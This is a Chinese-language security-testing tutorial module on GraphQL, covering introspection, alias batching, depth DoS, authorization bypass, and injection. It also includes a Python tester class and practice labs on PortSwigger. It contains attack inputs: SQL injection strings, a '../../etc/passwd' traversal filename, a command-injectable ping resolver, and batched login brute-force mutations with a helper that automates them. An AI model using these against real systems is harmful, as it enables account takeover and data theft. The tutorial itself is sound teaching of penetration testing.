# 05 GraphQL安全测试 —— 现代API的主战场

> GraphQL正在快速取代传统REST API。
> 如果你只测REST接口，不会测GraphQL，就落伍了。
> GraphQL的安全问题和REST有很多不同——**它有自己独特的攻击面**。

---

## 一、GraphQL基础（测试前必须懂）

### 1.1 REST vs GraphQL

```
REST API：
  多个固定端点，每个端点返回固定数据结构
  GET /api/users/1     → 返回用户信息
  GET /api/users/1/posts → 返回用户的帖子
  GET /api/users/1/friends → 返回用户的好友
  请求多次才知道有哪些字段

GraphQL：
  一个端点，客户端自己指定要什么字段
  POST /graphql
  Body:
    query {
      user(id: "1") {
        name
        posts {
          title
        }
        friends {
          name
        }
      }
    }
  一次请求拿到所有需要的数据
```

### 1.2 GraphQL的核心概念

```
[Query] 查询 — 读取数据（类似GET）
  query {
    user(id: "1") {
      name
      email
    }
  }

[Mutation] 变更 — 修改数据（类似POST/PUT/DELETE）
  mutation {
    createUser(input: {name: "张三", email: "zhangsan@example.com"}) {
      id
      name
    }
  }

[Subscription] 订阅 — 实时推送（WebSocket）

[Schema] 模式 — 定义数据结构和可用的字段、类型
  type User {
    id: ID!
    name: String!
    email: String!
    role: String!
  }

[Introspection] 内省 — 查询GraphQL自己有哪些Query/Mutation
  query {
    __schema {
      types {
        name
        fields {
          name
        }
      }
    }
  }

Resolver — 每个字段对应的处理函数
  resolver: user(id: "1") {
    name: resolver_for_name()     ← 这个函数从数据库读name字段
    email: resolver_for_email()    ← 这个函数从数据库读email字段
  }
```

---

## 二、GraphQL的安全问题（按重要性排序）

### 2.1 内省（Introspection）—— 攻击面的放大器

```
问题：默认开启的内省功能，暴露了所有Query、Mutation、字段、类型

正常应该：
  测试环境：开启内省，方便开发调试
  生产环境：关闭内省（security by design）

测试方法：

[方法1] 内省查询
POST /graphql
Body:
query {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name }
        args { name type { name } }
      }
    }
  }
}

[方法2] 用GraphQL Playground/Apollo Studio
有些GraphQL服务提供了图形化工具
访问 /playground 或 /graphql 接口

[方法3] 枚举字段
query {
  __type(name: "User") {
    name
    fields {
      name
      type { name }
    }
  }
}

发现了什么：
- 所有Query和Mutation的完整列表
- 每个字段的数据类型
- 认证和授权的字段名（如 role, isAdmin）
- 可能暴露的敏感字段（password, secret, internal_id）

防御：生产环境关闭内省
  introspection: false
```

### 2.2 批量查询/别名滥用 —— 绕过限制

```
GraphQL支持在一个请求中发送多个查询：

query {
  user1: user(id: "1") { name }
  user2: user(id: "2") { name }
  user3: user(id: "3") { name }
  ...
  user100: user(id: "100") { name }
}

作用1：绕过频率限制
  如果服务端限制每个请求只能查询一次
  攻击者在一个请求里查100次 → 绕过

作用2：绕过字段级别限制
  如果某个接口限制了只能查自己的数据
  用别名查多个ID → 枚举所有用户

测试：
  mutation {
    login1: login(username: "admin", password: "123456") { success }
    login2: login(username: "admin", password: "admin") { success }
    login3: login(username: "admin", password: "password") { success }
    login4: login(username: "admin", password: "admin123") { success }
    login5: login(username: "admin", password: "qwerty") { success }
  }
  → 在一个请求里暴力破解登录
```

### 2.3 深度限制缺失 —— DoS风险

```
GraphQL可以嵌套查询：

query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            ...（无限嵌套）
          }
        }
      }
    }
  }
}

问题：
- 查询深度无限 → 数据库被拖垮
- 每个字段的resolver都可能查询数据库
- 嵌套10层 × 每层10个 = 100亿次操作

防御：设置查询复杂度限制和深度限制
  depthLimit: 10
  maxDepth: 10

测试：
  逐步增加嵌套深度，观察响应时间
  query { a: user { b: friends { c: friends { d: friends { e: friends { f: friends } } } } } }
  如果响应时间急剧增长 → 可能存在DoS风险
```

### 2.4 授权绕过 —— GraphQL独有问题

```
GraphQL的授权有独特的坑：

[坑1] Query不检查授权，但Mutation检查
  query {
    allUsers {           ← 这个Query可能没做授权检查
      name
      passwordHash       ← 如果返回了passwordHash……
    }
  }

[坑2] N+1查询问题导致授权失效
  # 看似只查了当前用户
  query { me { name email } }

  # 但如果me字段的resolver里
  # 对每个字段分别查数据库：
  resolver: me {
    name: SELECT name FROM users WHERE id = current_user_id    # 检查了
    email: SELECT email FROM users WHERE id = current_user_id  # 也检查了
    password: SELECT password FROM users WHERE id = current_user_id
    # 如果password字段没加权限检查 → 数据泄露！
  }

[坑3] 服务端字段 ≠ 客户端可见字段
  服务端Schema: type User { id, name, email, passwordHash, role }
  客户端Query: { name email }  ← 看起来只请求了name和email

  但如果服务端没有限制resolver的执行范围：
  resolver: {
    name: user.name,       ← 返回了
    passwordHash: user.passwordHash  ← 也执行了！
    # 即使响应中不包含passwordHash
    # resolver中的操作可能产生副作用
  }

测试方法：
  1. 用admin账号的Token，发一个admin级别的Query
  2. 用普通用户账号，发同样的Query
  3. 对比两者返回的数据是否完全相同
  4. 如果普通用户能拿到admin数据 → 授权绕过
```

### 2.5 SQL/NoSQL注入 —— GraphQL版本的注入

```
GraphQL本身不防注入。Query中的字符串可以包含注入payload：

query {
  searchUsers(name: "' OR 1=1 --") {
    id
    name
  }
}

如果resolver直接用这个参数拼SQL/数据库查询：
  db.query(f"SELECT * FROM users WHERE name = '{name}'")
  → SQL注入

测试方法和传统SQL注入一样：
  1. 基础测试：' " \ ; -- 注释
  2. 布尔盲注：' AND 1=1 --
  3. UNION注入（如果返回多个字段）

GraphQL专用的注入测试：
  1. Introspection发现所有字段名
  2. 对每个输入参数测试注入
  3. 特别关注：search, filter, where, query等搜索相关参数
```

### 2.6 Batching Attacks —— 认证绕过

```
有些系统的认证依赖HTTP层面（如rate limit、账号锁定）。

如果GraphQL接受多个mutation在一个请求中：
  mutation {
    login1: login(username: "admin", password: "guess1") { success }
    login2: login(username: "admin", password: "guess2") { success }
    login3: login(username: "admin", password: "guess3") { success }
    ...
    login100: login(username: "admin", password: "guess100") { success }
  }

结果：
  - HTTP层面只发了一个请求
  - GraphQL层面执行了100次登录尝试
  → 绕过HTTP层面的暴力破解防护
  → 绕过账号锁定机制（可能只检查同一个HTTP请求）

测试：
  mutation {
    l1: login(user: "admin", pass: "1") { ok }
    l2: login(user: "admin", pass: "2") { ok }
    l3: login(user: "admin", pass: "3") { ok }
    # ... 继续
  }
  如果有任何一个返回 ok:true → 找到了密码
```

### 2.7 路径遍历/资源注入

```
某些GraphQL API提供文件操作相关功能：

mutation {
  uploadFile(filename: "../../etc/passwd") { url }
}

或提供系统命令：

type Query {
  ping(host: String!): String
}

resolver: ping(host) {
  system("ping -c 1 " + host)
}

→ 命令注入！
```

---

## 三、GraphQL安全测试工具

### 3.1 手动测试

```bash
# 内省查询（发现所有API）
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}'

# 查询示例
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"1\"){id name email role}}"}'
```

### 3.2 自动化工具

```bash
#graphql-map（内省和攻击面发现）
# https://github.com/swisskyrepo/GraphQLmap
# Kali自带

# Clairvoyance（内省）
# https://github.com/nicholasaleks/Clairvoyance

# InQL（Burp插件）
# BApp Store搜索InQL → 安装
# 自动发现GraphQL端点，生成内省查询
```

### 3.3 InQL使用

```
Burp Suite → Extender → BApp Store → 搜索 InQL → Install

用法：
1. 被动扫描发现GraphQL端点（/graphql, /api, /query）
2. 右键 → Send to InQL Scanner
3. InQL会自动执行内省，显示：
   - 所有类型
   - 所有Query和Mutation
   - 所有输入参数
   - 所有枚举值

4. 用InQL生成测试Query
5. 在Repeater中修改和重放
```

---

## 四、动手实践

### 实践1：发现和内省GraphQL API

```
目标：PortSwigger Web Security Academy - GraphQL labs
地址：https://portswigger.net/web-security/graphql

Lab 1: Retrieving hidden Metafields
- 找到GraphQL端点
- 用内省或字段枚举发现隐藏字段
- 读取管理员数据

Lab 2: Bypassing GraphQL brute force protections
- 用批量mutation绕过登录频率限制
```

### 实践2：完整的GraphQL渗透测试

```python
"""GraphQL安全测试辅助脚本"""
import requests

class GraphQLTester:
    def __init__(self, url, headers=None):
        self.url = url
        self.headers = headers or {"Content-Type": "application/json"}

    def introspection(self):
        """获取完整的GraphQL Schema"""
        query = """
        {
          __schema {
            queryType { name }
            mutationType { name }
            types {
              name
              kind
              fields(includeDeprecated: true) {
                name
                args { name type { name kind ofType { name } } }
                isDeprecated
              }
            }
          }
        }
        """
        resp = requests.post(self.url, json={"query": query}, headers=self.headers)
        return resp.json()

    def query(self, query_str, variables=None):
        """发送查询"""
        payload = {"query": query_str}
        if variables:
            payload["variables"] = variables
        resp = requests.post(self.url, json=payload, headers=self.headers)
        return resp.json()

    def batch_bruteforce(self, query_template, param_name, values):
        """批量查询（绕过限制）"""
        queries = []
        for i, val in enumerate(values):
            alias = f"q{i}"
            q = f'{alias}:{query_template.replace(param_name, f'"{val}"')}'
            queries.append(q)

        batch_query = "{" + " ".join(queries) + "}"
        resp = requests.post(self.url, json={"query": batch_query}, headers=self.headers)
        return resp.json()

    def depth_test(self, depth=10):
        """测试深度嵌套查询"""
        # 生成深度嵌套的查询
        field = "user { id }"
        query = "{" + field * depth + "}"
        resp = requests.post(self.url, json={"query": query}, headers=self.headers)
        return {
            "depth": depth,
            "status": resp.status_code,
            "response_time": resp.elapsed.total_seconds(),
            "response": resp.text[:200]
        }


# 使用示例
# gql = GraphQLTester("https://target.com/graphql", {"Authorization": "Bearer token"})

# 1. 获取Schema
# schema = gql.introspection()
# print(json.dumps(schema, indent=2))

# 2. 尝试内省（可能失败，如果内省被禁）
# 如果失败，尝试字段枚举

# 3. 暴力破解测试
# results = gql.batch_bruteforce(
#     'login(user:"admin",pass:"{}"){{ok}}',
#     "{}",
#     ["password1", "password2", "admin", "123456"]
# )
```

---

## 五、GraphQL安全检查清单

```
发现和枚举：
  □ 找到GraphQL端点（/graphql, /api/graphql, /query）
  □ 执行内省查询获取完整Schema
  □ 枚举字段发现隐藏字段
  □ 发现所有Mutation操作

认证和授权：
  □ 未认证访问是否能获取敏感数据
  □ 普通用户Token能否访问管理员数据
  □ 逐字段检查授权（resolver级别）
  □ 尝试访问id参数枚举其他用户数据

批量和速率限制：
  □ 批量查询能否绕过频率限制
  □ 批量登录能否绕过暴力破解防护
  □ 批量查询能否绕过字段级别限制

注入：
  □ 对每个输入参数测试SQL注入
  □ 对每个输入参数测试命令注入
  □ 测试CRLF注入（HTTP头注入）

DoS：
  □ 测试深度嵌套查询
  □ 测试查询复杂度
  □ 测试字段数量上限

访问控制：
  □ 检查Query和Mutation是否都有授权
  □ 验证IDOR防护（改ID参数）
  □ 验证服务端是否过滤了敏感字段
```

---

## 六、自测清单

- [ ] GraphQL和REST的核心区别是什么？
- [ ] 什么是内省（Introspection）？为什么它是安全风险？
- [ ] 如何用别名实现批量查询？
- [ ] GraphQL的深度嵌套会导致什么问题？
- [ ] GraphQL中如何测试授权绕过（IDOR）？
- [ ] GraphQL中的SQL注入和传统SQL注入有什么不同？
- [ ] 如何用InQL/Burp测试GraphQL API？
- [ ] 能在PortSwigger完成至少2个GraphQL Lab？

---

> **相关模块：**
> - [02 API安全测试](../02-api-security/README.md) —— GraphQL是API的一种
> - [04 CVSS评级](../04-cvss-severity/README.md) —— 给GraphQL漏洞打分
